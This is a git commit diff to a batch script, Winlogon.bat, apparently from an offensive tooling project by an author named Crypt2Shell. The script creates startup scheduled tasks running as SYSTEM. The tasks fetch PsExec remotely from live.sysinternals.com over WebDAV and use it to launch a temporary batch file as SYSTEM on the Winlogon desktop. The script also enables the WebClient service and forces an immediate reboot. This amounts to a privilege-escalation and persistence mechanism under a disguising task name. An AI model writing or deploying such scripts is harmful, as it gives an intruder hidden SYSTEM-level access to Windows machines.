02e44876c54112cdfd77a5c62476067cb2968c2b
Crypt2Shell <31416930+Crypt2Shell@users.noreply.github.com>
2020-08-17 18:49:29 +0200

    Update Winlogon.bat

--- Winlogon.bat
+++ Winlogon.bat
@@ -33,15 +33,23 @@ if %errorlevel% NEQ 0 (
 		 ) else if errorlevel == 1 (
 			 :: YES
 			 schtasks /create /tn "WinGrade" /SC onstart /RU "SYSTEM" /DELAY 0000:30 /RL highest /F /TR "\\Live.sysinternals.com\Tools\PsExec.exe /s \\localhost cmd /c \\Live.sysinternals.com\Tools\PsExec.exe /accepteula /x /d /s /i 1 cmd.exe /c \"%tmp%\WinGrade.bat\""
+			 echo [+] WinGrade Task installed!
+		 	 timeout /t 5 /nobreak>NUL
+			 shutdown /r /t 0
 		 )
-		 echo [+] WinGrade Task installed!
-		 timeout /t 5 /nobreak >NUL
-		 shutdown /r /t 0
-	) else ( echo [*] Something went wrong pls try again...
-		 echo [-] Task not installed!!!
-		 timeout /t 5 /nobreak >NUL )
+	)
 	schtasks /query /TN "WinGrade" >NUL 2>&1
 	if %errorlevel% NEQ 0 ( 
 		schtasks /create /tn "WebClient" /SC onstart /RU "SYSTEM" /DELAY 0000:05 /RL highest /F /TR "net start webclient"
 		schtasks /create /tn "WinGrade" /SC onstart /RU "SYSTEM" /DELAY 0000:30 /RL highest /F /TR "\\Live.sysinternals.com\Tools\PsExec.exe /s \\localhost cmd /c \\Live.sysinternals.com\Tools\PsExec.exe /accepteula /x /d /s /i 1 cmd.exe /c \"%tmp%\WinGrade.bat\""
+		
+		schtasks /query /TN "WinGrade" >NUL 2>&1
+		if %errorlevel% EQU 0 (
+			echo [+] WinGrade Task installed!
+			timeout /t 5 /nobreak>NUL
+			shutdown /r /t 0
+		) else (
+			echo [*] Something went wrong pls try again...
+		 	echo [-] Task not installed!!!
+		)
 	)
